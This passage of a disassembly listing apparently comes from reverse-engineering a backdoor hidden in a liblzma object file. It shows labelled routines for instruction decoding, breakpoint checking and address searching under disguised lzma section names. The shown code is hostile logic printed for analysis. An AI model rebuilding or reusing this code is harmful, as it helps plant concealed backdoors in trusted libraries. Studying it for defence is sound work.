.text.x86_codd:00000000000009E3                 movsx   rcx, byte ptr [rdx]
.text.x86_codd:00000000000009E7                 test    byte ptr [rbx+11h], 8
.text.x86_codd:00000000000009EB                 mov     [rbx+30h], rcx
.text.x86_codd:00000000000009EF
.text.x86_codd:00000000000009EF loc_9EF:                                ; CODE XREF: code_dasm+956↑j
.text.x86_codd:00000000000009EF                 jnz     loc_66D
.text.x86_codd:00000000000009F5                 sub     rdx, r12
.text.x86_codd:00000000000009F8                 mov     [rbx], r12
.text.x86_codd:00000000000009FB                 inc     rdx
.text.x86_codd:00000000000009FE                 jmp     loc_4D1
.text.x86_codd:0000000000000A03 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000A03
.text.x86_codd:0000000000000A03 loc_A03:                                ; CODE XREF: code_dasm+418↑j
.text.x86_codd:0000000000000A03                 lea     rax, [rdx+1]
.text.x86_codd:0000000000000A07                 cmp     rax, rbp
.text.x86_codd:0000000000000A0A                 jnb     loc_A95
.text.x86_codd:0000000000000A10                 lea     rsi, [rbx+10h]
.text.x86_codd:0000000000000A14                 xor     eax, eax
.text.x86_codd:0000000000000A16                 mov     ecx, 12h
.text.x86_codd:0000000000000A1B                 mov     rdi, rsi
.text.x86_codd:0000000000000A1E                 rep stosd
.text.x86_codd:0000000000000A20                 xor     eax, eax
.text.x86_codd:0000000000000A22                 mov     [rbx], r12
.text.x86_codd:0000000000000A25                 mov     qword ptr [rbx+8], 4
.text.x86_codd:0000000000000A2D                 cmp     byte ptr [rdx+1], 0FAh
.text.x86_codd:0000000000000A31                 setz    al
.text.x86_codd:0000000000000A34                 lea     eax, [rax+rax+0A5FCh]
.text.x86_codd:0000000000000A3B                 jmp     loc_4E1
.text.x86_codd:0000000000000A40 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000A40
.text.x86_codd:0000000000000A40 loc_A40:                                ; CODE XREF: code_dasm+1E6↑j
.text.x86_codd:0000000000000A40                 lea     rcx, [rdx+2]
.text.x86_codd:0000000000000A44                 cmp     rcx, rbp
.text.x86_codd:0000000000000A47                 jnb     short loc_A95
.text.x86_codd:0000000000000A49                 mov     sil, [rdx+2]
.text.x86_codd:0000000000000A4D                 mov     ecx, r8d
.text.x86_codd:0000000000000A50                 and     ecx, 1Fh
.text.x86_codd:0000000000000A53                 mov     [rbx+1Ah], sil
.text.x86_codd:0000000000000A57                 test    sil, sil
.text.x86_codd:0000000000000A5A                 js      short loc_A60
.text.x86_codd:0000000000000A5C                 or      byte ptr [rbx+1Bh], 8
.text.x86_codd:0000000000000A60
.text.x86_codd:0000000000000A60 loc_A60:                                ; CODE XREF: code_dasm+A4A↑j
.text.x86_codd:0000000000000A60                 shl     eax, 8
.text.x86_codd:0000000000000A63                 mov     [rbx+28h], eax
.text.x86_codd:0000000000000A66                 cmp     cl, 2
.text.x86_codd:0000000000000A69                 jnz     short loc_A70
.text.x86_codd:0000000000000A6B                 or      eax, 38h
.text.x86_codd:0000000000000A6E                 jmp     short loc_A78
.text.x86_codd:0000000000000A70 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000A70
.text.x86_codd:0000000000000A70 loc_A70:                                ; CODE XREF: code_dasm+A59↑j
.text.x86_codd:0000000000000A70                 cmp     cl, 3
.text.x86_codd:0000000000000A73                 jnz     short loc_A84
.text.x86_codd:0000000000000A75                 or      eax, 3Ah
.text.x86_codd:0000000000000A78
.text.x86_codd:0000000000000A78 loc_A78:                                ; CODE XREF: code_dasm+A5E↑j
.text.x86_codd:0000000000000A78                 mov     [rbx+28h], eax
.text.x86_codd:0000000000000A7B                 add     rdx, 3
.text.x86_codd:0000000000000A7F                 jmp     loc_3EA
.text.x86_codd:0000000000000A84 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000A84
.text.x86_codd:0000000000000A84 loc_A84:                                ; CODE XREF: code_dasm+A63↑j
.text.x86_codd:0000000000000A84                 dec     cl
.text.x86_codd:0000000000000A86                 jnz     loc_5F6
.text.x86_codd:0000000000000A8C                 add     rdx, 3
.text.x86_codd:0000000000000A90                 jmp     loc_1B9
.text.x86_codd:0000000000000A95 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000A95
.text.x86_codd:0000000000000A95 loc_A95:                                ; CODE XREF: code_dasm:loc_55↑j
.text.x86_codd:0000000000000A95                                         ; code_dasm+159↑j ...
.text.x86_codd:0000000000000A95                 mov     ecx, 16h
.text.x86_codd:0000000000000A9A                 xor     eax, eax
.text.x86_codd:0000000000000A9C                 mov     rdi, rbx
.text.x86_codd:0000000000000A9F                 rep stosd
.text.x86_codd:0000000000000AA1                 jmp     loc_5F6
.text.x86_codd:0000000000000AA6 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000AA6
.text.x86_codd:0000000000000AA6 loc_AA6:                                ; CODE XREF: code_dasm+4D9↑j
.text.x86_codd:0000000000000AA6                                         ; code_dasm+5E8↑j
.text.x86_codd:0000000000000AA6                 add     rsp, 20h
.text.x86_codd:0000000000000AAA                 pop     rbx
.text.x86_codd:0000000000000AAB                 pop     rbp
.text.x86_codd:0000000000000AAC                 pop     r12
.text.x86_codd:0000000000000AAE                 retn
.text.x86_codd:0000000000000AAE code_dasm       endp
.text.x86_codd:0000000000000AAE
.text.x86_codd:0000000000000AAE _text_x86_codd  ends
.text.x86_codd:0000000000000AAE
.text.lzma_block_buffer_encoda:0000000000000AB0 ; ===========================================================================
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0 ; Segment type: Pure code
.text.lzma_block_buffer_encoda:0000000000000AB0 ; Segment permissions: Read/Execute
.text.lzma_block_buffer_encoda:0000000000000AB0 _text_lzma_block_buffer_encoda segment para public 'CODE' use64
.text.lzma_block_buffer_encoda:0000000000000AB0                 assume cs:_text_lzma_block_buffer_encoda
.text.lzma_block_buffer_encoda:0000000000000AB0                 ;org 0AB0h
.text.lzma_block_buffer_encoda:0000000000000AB0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0 ; __int64 __fastcall check_software_breakpoint(_DWORD *, __int64, int)
.text.lzma_block_buffer_encoda:0000000000000AB0 check_software_breakpoint proc near     ; CODE XREF: sub_B00+15↓p
.text.lzma_block_buffer_encoda:0000000000000AB0                                         ; sub_2A40+A6↓p ...
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0 var_8           = dword ptr -8
.text.lzma_block_buffer_encoda:0000000000000AB0 var_4           = dword ptr -4
.text.lzma_block_buffer_encoda:0000000000000AB0
.text.lzma_block_buffer_encoda:0000000000000AB0                 endbr64
.text.lzma_block_buffer_encoda:0000000000000AB4                 sub     rsi, rdi
.text.lzma_block_buffer_encoda:0000000000000AB7                 mov     [rsp+var_8], 5E2h
.text.lzma_block_buffer_encoda:0000000000000ABF                 mov     eax, edx
.text.lzma_block_buffer_encoda:0000000000000AC1                 xor     edx, edx
.text.lzma_block_buffer_encoda:0000000000000AC3                 mov     [rsp+var_4], 0F223h
.text.lzma_block_buffer_encoda:0000000000000ACB                 cmp     rsi, 3
.text.lzma_block_buffer_encoda:0000000000000ACF                 jle     short loc_AF8
.text.lzma_block_buffer_encoda:0000000000000AD1                 mov     edx, [rsp+var_8]
.text.lzma_block_buffer_encoda:0000000000000AD5                 shl     edx, 10h
.text.lzma_block_buffer_encoda:0000000000000AD8                 mov     [rsp+var_8], edx
.text.lzma_block_buffer_encoda:0000000000000ADC                 mov     edx, [rsp+var_8]
.text.lzma_block_buffer_encoda:0000000000000AE0                 or      edx, eax
.text.lzma_block_buffer_encoda:0000000000000AE2                 mov     [rsp+var_8], edx
.text.lzma_block_buffer_encoda:0000000000000AE6                 mov     eax, [rsp+var_8]
.text.lzma_block_buffer_encoda:0000000000000AEA                 mov     edx, [rsp+var_4]
.text.lzma_block_buffer_encoda:0000000000000AEE                 add     eax, [rdi]
.text.lzma_block_buffer_encoda:0000000000000AF0                 cmp     eax, edx
.text.lzma_block_buffer_encoda:0000000000000AF2                 setz    dl
.text.lzma_block_buffer_encoda:0000000000000AF5                 movzx   edx, dl
.text.lzma_block_buffer_encoda:0000000000000AF8
.text.lzma_block_buffer_encoda:0000000000000AF8 loc_AF8:                                ; CODE XREF: check_software_breakpoint+1F↑j
.text.lzma_block_buffer_encoda:0000000000000AF8                 mov     eax, edx
.text.lzma_block_buffer_encoda:0000000000000AFA                 retn
.text.lzma_block_buffer_encoda:0000000000000AFA check_software_breakpoint endp
.text.lzma_block_buffer_encoda:0000000000000AFA
.text.lzma_block_buffer_encoda:0000000000000AFA _text_lzma_block_buffer_encoda ends
.text.lzma_block_buffer_encoda:0000000000000AFA
.text.lzma_raw_coder_memusaga:0000000000000B00 ; ===========================================================================
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00 ; Segment type: Pure code
.text.lzma_raw_coder_memusaga:0000000000000B00 ; Segment permissions: Read/Execute
.text.lzma_raw_coder_memusaga:0000000000000B00 _text_lzma_raw_coder_memusaga segment para public 'CODE' use64
.text.lzma_raw_coder_memusaga:0000000000000B00                 assume cs:_text_lzma_raw_coder_memusaga
.text.lzma_raw_coder_memusaga:0000000000000B00                 ;org 0B00h
.text.lzma_raw_coder_memusaga:0000000000000B00                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00 ; =============== S U B R O U T I N E =======================================
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00 ; __int64 __fastcall sub_B00(_DWORD *, unsigned __int64, _QWORD *, int)
.text.lzma_raw_coder_memusaga:0000000000000B00 sub_B00         proc near               ; CODE XREF: apply_method_1+5F↓p
.text.lzma_raw_coder_memusaga:0000000000000B00                                         ; apply_method_1+7E↓p ...
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00 var_70          = qword ptr -70h
.text.lzma_raw_coder_memusaga:0000000000000B00 var_68          = qword ptr -68h
.text.lzma_raw_coder_memusaga:0000000000000B00 var_48          = dword ptr -48h
.text.lzma_raw_coder_memusaga:0000000000000B00
.text.lzma_raw_coder_memusaga:0000000000000B00                 push    rbp
.text.lzma_raw_coder_memusaga:0000000000000B01                 mov     r8, rdi
.text.lzma_raw_coder_memusaga:0000000000000B04                 mov     rbp, rdx
.text.lzma_raw_coder_memusaga:0000000000000B07                 push    rbx
.text.lzma_raw_coder_memusaga:0000000000000B08                 sub     rsp, 68h
.text.lzma_raw_coder_memusaga:0000000000000B0C                 test    ecx, ecx
.text.lzma_raw_coder_memusaga:0000000000000B0E                 jz      short loc_B2E
.text.lzma_raw_coder_memusaga:0000000000000B10                 mov     edx, 0E230h
.text.lzma_raw_coder_memusaga:0000000000000B15                 call    check_software_breakpoint ; PIC mode
.text.lzma_raw_coder_memusaga:0000000000000B1A                 test    eax, eax
.text.lzma_raw_coder_memusaga:0000000000000B1C                 jz      short loc_B7E
.text.lzma_raw_coder_memusaga:0000000000000B1E                 test    rbp, rbp
.text.lzma_raw_coder_memusaga:0000000000000B21                 jz      short loc_B27
.text.lzma_raw_coder_memusaga:0000000000000B23                 mov     [rbp+0], rdi
.text.lzma_raw_coder_memusaga:0000000000000B27
.text.lzma_raw_coder_memusaga:0000000000000B27 loc_B27:                                ; CODE XREF: sub_B00+21↑j
.text.lzma_raw_coder_memusaga:0000000000000B27                 mov     eax, 1
.text.lzma_raw_coder_memusaga:0000000000000B2C                 jmp     short loc_B7E
.text.lzma_raw_coder_memusaga:0000000000000B2E ; ---------------------------------------------------------------------------
.text.lzma_raw_coder_memusaga:0000000000000B2E
.text.lzma_raw_coder_memusaga:0000000000000B2E loc_B2E:                                ; CODE XREF: sub_B00+E↑j
.text.lzma_raw_coder_memusaga:0000000000000B2E                 mov     ebx, ecx
.text.lzma_raw_coder_memusaga:0000000000000B30                 lea     rdi, [rsp+78h+var_70]
.text.lzma_raw_coder_memusaga:0000000000000B35                 mov     ecx, 16h
.text.lzma_raw_coder_memusaga:0000000000000B3A                 mov     rdx, rsi
.text.lzma_raw_coder_memusaga:0000000000000B3D                 mov     eax, ebx
.text.lzma_raw_coder_memusaga:0000000000000B3F                 mov     rsi, r8
.text.lzma_raw_coder_memusaga:0000000000000B42                 rep stosd
.text.lzma_raw_coder_memusaga:0000000000000B44                 lea     rdi, [rsp+78h+var_70]
.text.lzma_raw_coder_memusaga:0000000000000B49                 call    code_dasm       ; PIC mode
.text.lzma_raw_coder_memusaga:0000000000000B4E                 test    eax, eax
.text.lzma_raw_coder_memusaga:0000000000000B50                 jz      short loc_B7C
.text.lzma_raw_coder_memusaga:0000000000000B52                 cmp     [rsp+78h+var_48], 0F9Fh
.text.lzma_raw_coder_memusaga:0000000000000B5A                 jnz     short loc_B7C
.text.lzma_raw_coder_memusaga:0000000000000B5C                 mov     rax, [rsp+78h+var_68]
.text.lzma_raw_coder_memusaga:0000000000000B61                 add     rax, [rsp+78h+var_70]
.text.lzma_raw_coder_memusaga:0000000000000B66                 test    al, 0Fh
.text.lzma_raw_coder_memusaga:0000000000000B68                 jnz     short loc_B7C
.text.lzma_raw_coder_memusaga:0000000000000B6A                 test    rbp, rbp
.text.lzma_raw_coder_memusaga:0000000000000B6D                 jnz     short loc_B76
.text.lzma_raw_coder_memusaga:0000000000000B6F
.text.lzma_raw_coder_memusaga:0000000000000B6F loc_B6F:                                ; CODE XREF: sub_B00+7A↓j
.text.lzma_raw_coder_memusaga:0000000000000B6F                 mov     ebx, 1
.text.lzma_raw_coder_memusaga:0000000000000B74                 jmp     short loc_B7C
.text.lzma_raw_coder_memusaga:0000000000000B76 ; ---------------------------------------------------------------------------
.text.lzma_raw_coder_memusaga:0000000000000B76
.text.lzma_raw_coder_memusaga:0000000000000B76 loc_B76:                                ; CODE XREF: sub_B00+6D↑j
.text.lzma_raw_coder_memusaga:0000000000000B76                 mov     [rbp+0], rax
.text.lzma_raw_coder_memusaga:0000000000000B7A                 jmp     short loc_B6F
.text.lzma_raw_coder_memusaga:0000000000000B7C ; ---------------------------------------------------------------------------
.text.lzma_raw_coder_memusaga:0000000000000B7C
.text.lzma_raw_coder_memusaga:0000000000000B7C loc_B7C:                                ; CODE XREF: sub_B00+50↑j
.text.lzma_raw_coder_memusaga:0000000000000B7C                                         ; sub_B00+5A↑j ...
.text.lzma_raw_coder_memusaga:0000000000000B7C                 mov     eax, ebx
.text.lzma_raw_coder_memusaga:0000000000000B7E
.text.lzma_raw_coder_memusaga:0000000000000B7E loc_B7E:                                ; CODE XREF: sub_B00+1C↑j
.text.lzma_raw_coder_memusaga:0000000000000B7E                                         ; sub_B00+2C↑j
.text.lzma_raw_coder_memusaga:0000000000000B7E                 add     rsp, 68h
.text.lzma_raw_coder_memusaga:0000000000000B82                 pop     rbx
.text.lzma_raw_coder_memusaga:0000000000000B83                 pop     rbp
.text.lzma_raw_coder_memusaga:0000000000000B84                 retn
.text.lzma_raw_coder_memusaga:0000000000000B84 sub_B00         endp
.text.lzma_raw_coder_memusaga:0000000000000B84
.text.lzma_raw_coder_memusaga:0000000000000B84 _text_lzma_raw_coder_memusaga ends
.text.lzma_raw_coder_memusaga:0000000000000B84
.text.lzma2_encoder_inia:0000000000000B90 ; ===========================================================================
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90 ; Segment type: Pure code
.text.lzma2_encoder_inia:0000000000000B90 ; Segment permissions: Read/Execute
.text.lzma2_encoder_inia:0000000000000B90 _text_lzma2_encoder_inia segment para public 'CODE' use64
.text.lzma2_encoder_inia:0000000000000B90                 assume cs:_text_lzma2_encoder_inia
.text.lzma2_encoder_inia:0000000000000B90                 ;org 0B90h
.text.lzma2_encoder_inia:0000000000000B90                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90 ; =============== S U B R O U T I N E =======================================
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90 ; __int64 __fastcall apply_method_1(_DWORD *, __int64 *, unsigned __int64 *, _DWORD *, unsigned __int64, int)
.text.lzma2_encoder_inia:0000000000000B90                 public apply_method_1
.text.lzma2_encoder_inia:0000000000000B90 apply_method_1  proc near               ; CODE XREF: sub_2B00+F0↓p
.text.lzma2_encoder_inia:0000000000000B90                                         ; install_entries+28A↓p ...
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90 var_54          = dword ptr -54h
.text.lzma2_encoder_inia:0000000000000B90 var_50          = qword ptr -50h
.text.lzma2_encoder_inia:0000000000000B90 var_40          = qword ptr -40h
.text.lzma2_encoder_inia:0000000000000B90
.text.lzma2_encoder_inia:0000000000000B90                 endbr64
.text.lzma2_encoder_inia:0000000000000B94                 push    r15
.text.lzma2_encoder_inia:0000000000000B96                 xor     eax, eax
.text.lzma2_encoder_inia:0000000000000B98                 push    r14
.text.lzma2_encoder_inia:0000000000000B9A                 push    r13
.text.lzma2_encoder_inia:0000000000000B9C                 mov     r13, rdx
.text.lzma2_encoder_inia:0000000000000B9F                 push    r12
.text.lzma2_encoder_inia:0000000000000BA1                 push    rbp
.text.lzma2_encoder_inia:0000000000000BA2                 mov     rbp, r8
.text.lzma2_encoder_inia:0000000000000BA5                 push    rbx
.text.lzma2_encoder_inia:0000000000000BA6                 mov     rbx, rdi
.text.lzma2_encoder_inia:0000000000000BA9                 sub     rsp, 28h
.text.lzma2_encoder_inia:0000000000000BAD                 mov     [rsp+58h+var_40], rax
.text.lzma2_encoder_inia:0000000000000BB2                 lea     rax, [rsp+58h+var_40]
.text.lzma2_encoder_inia:0000000000000BB7                 mov     [rsp+58h+var_54], r9d
.text.lzma2_encoder_inia:0000000000000BBC                 mov     [rsp+58h+var_50], rax
.text.lzma2_encoder_inia:0000000000000BC1                 test    rsi, rsi
.text.lzma2_encoder_inia:0000000000000BC4                 jz      short loc_C1E
.text.lzma2_encoder_inia:0000000000000BC6                 mov     r14, rsi
.text.lzma2_encoder_inia:0000000000000BC9                 mov     r12, rcx
.text.lzma2_encoder_inia:0000000000000BCC                 mov     r15, rdi
.text.lzma2_encoder_inia:0000000000000BCF
.text.lzma2_encoder_inia:0000000000000BCF loc_BCF:                                ; CODE XREF: apply_method_1+6B↓j
.text.lzma2_encoder_inia:0000000000000BCF                 cmp     r12, r15
.text.lzma2_encoder_inia:0000000000000BD2                 jb      short loc_BE0
.text.lzma2_encoder_inia:0000000000000BD4
.text.lzma2_encoder_inia:0000000000000BD4 loc_BD4:                                ; CODE XREF: apply_method_1+66↓j
.text.lzma2_encoder_inia:0000000000000BD4                 mov     r15, [rsp+58h+var_40]
.text.lzma2_encoder_inia:0000000000000BD9                 test    r15, r15
.text.lzma2_encoder_inia:0000000000000BDC                 jnz     short loc_BFD
.text.lzma2_encoder_inia:0000000000000BDE                 jmp     short loc_C17
.text.lzma2_encoder_inia:0000000000000BE0 ; ---------------------------------------------------------------------------
.text.lzma2_encoder_inia:0000000000000BE0
.text.lzma2_encoder_inia:0000000000000BE0 loc_BE0:                                ; CODE XREF: apply_method_1+42↑j
.text.lzma2_encoder_inia:0000000000000BE0                 mov     ecx, [rsp+58h+var_54]
.text.lzma2_encoder_inia:0000000000000BE4                 mov     rdx, [rsp+58h+var_50]
.text.lzma2_encoder_inia:0000000000000BE9                 mov     rsi, rbp
.text.lzma2_encoder_inia:0000000000000BEC                 mov     rdi, r15
.text.lzma2_encoder_inia:0000000000000BEF                 call    sub_B00
.text.lzma2_encoder_inia:0000000000000BF4                 test    eax, eax
.text.lzma2_encoder_inia:0000000000000BF6                 jnz     short loc_BD4
.text.lzma2_encoder_inia:0000000000000BF8                 dec     r15
.text.lzma2_encoder_inia:0000000000000BFB                 jmp     short loc_BCF
.text.lzma2_encoder_inia:0000000000000BFD ; ---------------------------------------------------------------------------
.text.lzma2_encoder_inia:0000000000000BFD
.text.lzma2_encoder_inia:0000000000000BFD loc_BFD:                                ; CODE XREF: apply_method_1+4C↑j
.text.lzma2_encoder_inia:0000000000000BFD                 cmp     r15, r12
.text.lzma2_encoder_inia:0000000000000C00                 jnz     short loc_C1B
.text.lzma2_encoder_inia:0000000000000C02                 mov     ecx, [rsp+58h+var_54]
.text.lzma2_encoder_inia:0000000000000C06                 xor     edx, edx
.text.lzma2_encoder_inia:0000000000000C08                 mov     rsi, rbp
.text.lzma2_encoder_inia:0000000000000C0B                 mov     rdi, r12
.text.lzma2_encoder_inia:0000000000000C0E                 call    sub_B00
.text.lzma2_encoder_inia:0000000000000C13                 test    eax, eax
.text.lzma2_encoder_inia:0000000000000C15                 jnz     short loc_C1B
.text.lzma2_encoder_inia:0000000000000C17
.text.lzma2_encoder_inia:0000000000000C17 loc_C17:                                ; CODE XREF: apply_method_1+4E↑j
.text.lzma2_encoder_inia:0000000000000C17                 xor     eax, eax
.text.lzma2_encoder_inia:0000000000000C19                 jmp     short loc_C71
.text.lzma2_encoder_inia:0000000000000C1B ; ---------------------------------------------------------------------------
.text.lzma2_encoder_inia:0000000000000C1B
.text.lzma2_encoder_inia:0000000000000C1B loc_C1B:                                ; CODE XREF: apply_method_1+70↑j
.text.lzma2_encoder_inia:0000000000000C1B                                         ; apply_method_1+85↑j
.text.lzma2_encoder_inia:0000000000000C1B                 mov     [r14], r15
.text.lzma2_encoder_inia:0000000000000C1E
.text.lzma2_encoder_inia:0000000000000C1E loc_C1E:                                ; CODE XREF: apply_method_1+34↑j
.text.lzma2_encoder_inia:0000000000000C1E                 inc     rbx
.text.lzma2_encoder_inia:0000000000000C21                 lea     r14, [rbp-4]
.text.lzma2_encoder_inia:0000000000000C25                 test    r13, r13
.text.lzma2_encoder_inia:0000000000000C28                 jnz     short loc_C49
.text.lzma2_encoder_inia:0000000000000C2A
.text.lzma2_encoder_inia:0000000000000C2A loc_C2A:                                ; CODE XREF: apply_method_1+DF↓j
.text.lzma2_encoder_inia:0000000000000C2A                 mov     eax, 1
.text.lzma2_encoder_inia:0000000000000C2F                 jmp     short loc_C71
.text.lzma2_encoder_inia:0000000000000C31 ; ---------------------------------------------------------------------------
.text.lzma2_encoder_inia:0000000000000C31
.text.lzma2_encoder_inia:0000000000000C31 loc_C31:                                ; CODE XREF: apply_method_1+BC↓j
.text.lzma2_encoder_inia:0000000000000C31                 mov     ecx, [rsp+58h+var_54]
.text.lzma2_encoder_inia:0000000000000C35                 xor     edx, edx
.text.lzma2_encoder_inia:0000000000000C37                 mov     rsi, rbp
.text.lzma2_encoder_inia:0000000000000C3A                 mov     rdi, rbx
.text.lzma2_encoder_inia:0000000000000C3D                 call    sub_B00
.text.lzma2_encoder_inia:0000000000000C42                 test    eax, eax
.text.lzma2_encoder_inia:0000000000000C44                 jnz     short loc_C68
.text.lzma2_encoder_inia:0000000000000C46                 inc     rbx
.text.lzma2_encoder_inia:0000000000000C49
.text.lzma2_encoder_inia:0000000000000C49 loc_C49:                                ; CODE XREF: apply_method_1+98↑j
.text.lzma2_encoder_inia:0000000000000C49                 cmp     rbx, r14
.text.lzma2_encoder_inia:0000000000000C4C                 jb      short loc_C31
.text.lzma2_encoder_inia:0000000000000C4E                 cmp     r14, rbx
.text.lzma2_encoder_inia:0000000000000C51                 jnz     short loc_C68
.text.lzma2_encoder_inia:0000000000000C53                 mov     ecx, [rsp+58h+var_54]
.text.lzma2_encoder_inia:0000000000000C57                 xor     edx, edx
.text.lzma2_encoder_inia:0000000000000C59                 mov     rsi, rbp
.text.lzma2_encoder_inia:0000000000000C5C                 mov     rdi, rbx
.text.lzma2_encoder_inia:0000000000000C5F                 call    sub_B00
.text.lzma2_encoder_inia:0000000000000C64                 test    eax, eax
.text.lzma2_encoder_inia:0000000000000C66                 jz      short loc_C6B
.text.lzma2_encoder_inia:0000000000000C68
.text.lzma2_encoder_inia:0000000000000C68 loc_C68:                                ; CODE XREF: apply_method_1+B4↑j
.text.lzma2_encoder_inia:0000000000000C68                                         ; apply_method_1+C1↑j
.text.lzma2_encoder_inia:0000000000000C68                 mov     rbp, rbx
.text.lzma2_encoder_inia:0000000000000C6B
.text.lzma2_encoder_inia:0000000000000C6B loc_C6B:                                ; CODE XREF: apply_method_1+D6↑j
.text.lzma2_encoder_inia:0000000000000C6B                 mov     [r13+0], rbp
.text.lzma2_encoder_inia:0000000000000C6F                 jmp     short loc_C2A
.text.lzma2_encoder_inia:0000000000000C71 ; ---------------------------------------------------------------------------
.text.lzma2_encoder_inia:0000000000000C71
.text.lzma2_encoder_inia:0000000000000C71 loc_C71:                                ; CODE XREF: apply_method_1+89↑j
.text.lzma2_encoder_inia:0000000000000C71                                         ; apply_method_1+9F↑j
.text.lzma2_encoder_inia:0000000000000C71                 add     rsp, 28h
.text.lzma2_encoder_inia:0000000000000C75                 pop     rbx
.text.lzma2_encoder_inia:0000000000000C76                 pop     rbp
.text.lzma2_encoder_inia:0000000000000C77                 pop     r12
.text.lzma2_encoder_inia:0000000000000C79                 pop     r13
.text.lzma2_encoder_inia:0000000000000C7B                 pop     r14
.text.lzma2_encoder_inia:0000000000000C7D                 pop     r15
.text.lzma2_encoder_inia:0000000000000C7F                 retn
.text.lzma2_encoder_inia:0000000000000C7F apply_method_1  endp
.text.lzma2_encoder_inia:0000000000000C7F
.text.lzma2_encoder_inia:0000000000000C7F _text_lzma2_encoder_inia ends
.text.lzma2_encoder_inia:0000000000000C7F
.text.lzma_optimum_normaa:0000000000000C80 ; ===========================================================================
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80 ; Segment type: Pure code
.text.lzma_optimum_normaa:0000000000000C80 ; Segment permissions: Read/Execute
.text.lzma_optimum_normaa:0000000000000C80 _text_lzma_optimum_normaa segment para public 'CODE' use64
.text.lzma_optimum_normaa:0000000000000C80                 assume cs:_text_lzma_optimum_normaa
.text.lzma_optimum_normaa:0000000000000C80                 ;org 0C80h
.text.lzma_optimum_normaa:0000000000000C80                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80 ; =============== S U B R O U T I N E =======================================
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80 ; __int64 __fastcall Llzma_optimum_normal_0(unsigned __int64, unsigned __int64, __int64, char *)
.text.lzma_optimum_normaa:0000000000000C80 _Llzma_optimum_normal_0 proc near       ; CODE XREF: sub_2FE0+2A8↓p
.text.lzma_optimum_normaa:0000000000000C80                                         ; _Llzma_buf_cpy_0+8E↓p ...
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80 var_80          = byte ptr -80h
.text.lzma_optimum_normaa:0000000000000C80
.text.lzma_optimum_normaa:0000000000000C80                 endbr64
.text.lzma_optimum_normaa:0000000000000C84                 push    r13
.text.lzma_optimum_normaa:0000000000000C86                 mov     r13, rdx
.text.lzma_optimum_normaa:0000000000000C89                 mov     edx, 4
.text.lzma_optimum_normaa:0000000000000C8E                 push    r12
.text.lzma_optimum_normaa:0000000000000C90                 mov     r12, rsi
.text.lzma_optimum_normaa:0000000000000C93                 mov     esi, 81h
.text.lzma_optimum_normaa:0000000000000C98                 push    rbp
.text.lzma_optimum_normaa:0000000000000C99                 mov     rbp, rdi
.text.lzma_optimum_normaa:0000000000000C9C                 xor     edi, edi
.text.lzma_optimum_normaa:0000000000000C9E                 push    rbx
.text.lzma_optimum_normaa:0000000000000C9F                 mov     rbx, rcx
.text.lzma_optimum_normaa:0000000000000CA2                 mov     ecx, 7
.text.lzma_optimum_normaa:0000000000000CA7                 sub     rsp, 68h
.text.lzma_optimum_normaa:0000000000000CAB                 call    apply_one_entry_ex ; PIC mode
.text.lzma_optimum_normaa:0000000000000CB0                 test    eax, eax
.text.lzma_optimum_normaa:0000000000000CB2                 jnz     short loc_CB8
.text.lzma_optimum_normaa:0000000000000CB4
.text.lzma_optimum_normaa:0000000000000CB4 loc_CB4:                                ; CODE XREF: _Llzma_optimum_normal_0+55↓j
.text.lzma_optimum_normaa:0000000000000CB4                 xor     eax, eax
.text.lzma_optimum_normaa:0000000000000CB6                 jmp     short loc_D17
.text.lzma_optimum_normaa:0000000000000CB8 ; ---------------------------------------------------------------------------
.text.lzma_optimum_normaa:0000000000000CB8
.text.lzma_optimum_normaa:0000000000000CB8 loc_CB8:                                ; CODE XREF: _Llzma_optimum_normal_0+32↑j
.text.lzma_optimum_normaa:0000000000000CB8                 xor     eax, eax
.text.lzma_optimum_normaa:0000000000000CBA                 lea     rdi, [rsp+88h+var_80]
.text.lzma_optimum_normaa:0000000000000CBF                 mov     ecx, 16h
.text.lzma_optimum_normaa:0000000000000CC4                 test    rbx, rbx
.text.lzma_optimum_normaa:0000000000000CC7                 rep stosd
.text.lzma_optimum_normaa:0000000000000CC9                 lea     rax, [rsp+88h+var_80]
.text.lzma_optimum_normaa:0000000000000CCE                 cmovz   rbx, rax
.text.lzma_optimum_normaa:0000000000000CD2
.text.lzma_optimum_normaa:0000000000000CD2 loc_CD2:                                ; CODE XREF: _Llzma_optimum_normal_0+8B↓j
